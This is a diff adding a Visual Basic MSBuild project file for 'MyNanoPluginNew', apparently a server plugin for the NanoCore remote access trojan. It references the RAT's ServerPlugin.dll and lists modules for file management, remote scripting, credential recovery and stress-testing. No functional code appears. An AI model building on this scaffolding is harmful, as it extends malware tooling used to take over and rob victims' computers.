@@ -1,0 +1,205 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="12.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{E3F17A7B-282D-4085-8384-0EF3AD8E0EB9}</ProjectGuid>
+    <OutputType>Library</OutputType>
+    <RootNamespace>MyNanoPluginNew</RootNamespace>
+    <AssemblyName>MyNanoPluginNew</AssemblyName>
+    <FileAlignment>512</FileAlignment>
+    <MyType>Windows</MyType>
+    <TargetFrameworkVersion>v2.0</TargetFrameworkVersion>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <DefineDebug>true</DefineDebug>
+    <DefineTrace>true</DefineTrace>
+    <OutputPath>..\..\..\..\..\Desktop\Test\</OutputPath>
+    <DocumentationFile>MyNanoPluginNew.xml</DocumentationFile>
+    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <DebugType>pdbonly</DebugType>
+    <DefineDebug>false</DefineDebug>
+    <DefineTrace>true</DefineTrace>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DocumentationFile>MyNanoPluginNew.xml</DocumentationFile>
+    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionExplicit>On</OptionExplicit>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionCompare>Binary</OptionCompare>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionStrict>On</OptionStrict>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionInfer>Off</OptionInfer>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="ServerPlugin, Version=1.2.0.0, Culture=neutral, processorArchitecture=MSIL">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>..\..\..\..\..\Desktop\All\!Software\RATs\NanoCore Update\ServerPlugin.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
+  </ItemGroup>
+  <ItemGroup>
+    <Import Include="NanoCore" />
+    <Import Include="NanoCore.ServerPlugin" />
+    <Import Include="NanoCore.ServerPluginHost" />
+    <Import Include="System" />
+    <Import Include="System.Collections" />
+    <Import Include="System.Collections.Generic" />
+    <Import Include="System.Diagnostics" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="..\Shared Code\Network\Headers.vb">
+      <Link>Network\Headers.vb</Link>
+    </Compile>
+    <Compile Include="Forms\FileManager.Designer.vb">
+      <DependentUpon>FileManager.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FileManager.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="MultiControls\RecoveryMulti.Designer.vb">
+      <DependentUpon>RecoveryMulti.vb</DependentUpon>
+    </Compile>
+    <Compile Include="MultiControls\RecoveryMulti.vb">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="MultiControls\StressMulti.Designer.vb">
+      <DependentUpon>StressMulti.vb</DependentUpon>
+    </Compile>
+    <Compile Include="MultiControls\StressMulti.vb">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="UserControls\PluginInfo.Designer.vb">
+      <DependentUpon>PluginInfo.vb</DependentUpon>
+    </Compile>
+    <Compile Include="UserControls\PluginInfo.vb">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="UserControls\LiveLogs.Designer.vb">
+      <DependentUpon>LiveLogs.vb</DependentUpon>
+    </Compile>
+    <Compile Include="UserControls\LiveLogs.vb">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="Forms\Remote.Designer.vb">
+      <DependentUpon>Remote.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\Remote.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="UserControls\OverallStress.Designer.vb">
+      <DependentUpon>OverallStress.vb</DependentUpon>
+    </Compile>
+    <Compile Include="UserControls\OverallStress.vb">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="UserControls\Recovery.Designer.vb">
+      <DependentUpon>Recovery.vb</DependentUpon>
+    </Compile>
+    <Compile Include="UserControls\Recovery.vb">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="UserControls\RemoteScript.Designer.vb">
+      <DependentUpon>RemoteScript.vb</DependentUpon>
+    </Compile>
+    <Compile Include="UserControls\RemoteScript.vb">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="UserControls\StressTesting.Designer.vb">
+      <DependentUpon>StressTesting.vb</DependentUpon>
+    </Compile>
+    <Compile Include="UserControls\StressTesting.vb">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="Handlers\MiscCommandHandler.vb" />
+    <Compile Include="My Project\Resources.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+      <DependentUpon>Resources.resx</DependentUpon>
+    </Compile>
+    <Compile Include="My Project\Settings.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+      <DependentUpon>Settings.settings</DependentUpon>
+    </Compile>
+    <Compile Include="ServerMain.vb" />
+    <Compile Include="ServerPlugin.vb" />
+    <Compile Include="My Project\AssemblyInfo.vb" />
+    <Compile Include="Themes\Alerts.vb">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Themes\Graph.vb">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Utilities\ContextCallbacks.vb" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.config" />
+    <None Include="My Project\Settings.settings">
+      <CustomToolNamespace>My</CustomToolNamespace>
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.vb</LastGenOutput>
+    </None>
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Forms\FileManager.resx">
+      <DependentUpon>FileManager.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="MultiControls\RecoveryMulti.resx">
+      <DependentUpon>RecoveryMulti.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="MultiControls\StressMulti.resx">
+      <DependentUpon>StressMulti.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="UserControls\PluginInfo.resx">
+      <DependentUpon>PluginInfo.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="UserControls\LiveLogs.resx">
+      <DependentUpon>LiveLogs.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\Remote.resx">
+      <DependentUpon>Remote.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="UserControls\OverallStress.resx">
+      <DependentUpon>OverallStress.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="UserControls\Recovery.resx">
+      <DependentUpon>Recovery.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="UserControls\RemoteScript.resx">
+      <DependentUpon>RemoteScript.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="UserControls\StressTesting.resx">
+      <DependentUpon>StressTesting.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="My Project\Resources.resx">
+      <CustomToolNamespace>My.Resources</CustomToolNamespace>
+      <Generator>VbMyResourcesResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.vb</LastGenOutput>
+    </EmbeddedResource>
+  </ItemGroup>
+  <ItemGroup>
+    <Service Include="{94E38DFF-614B-4CBD-B67C-F211BB35CE8B}" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.VisualBasic.targets" />
+  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+       Other similar extension points exist, see Microsoft.Common.targets.
+  <Target Name="BeforeBuild">
+  </Target>
+  <Target Name="AfterBuild">
+  </Target>
+  -->
+</Project>
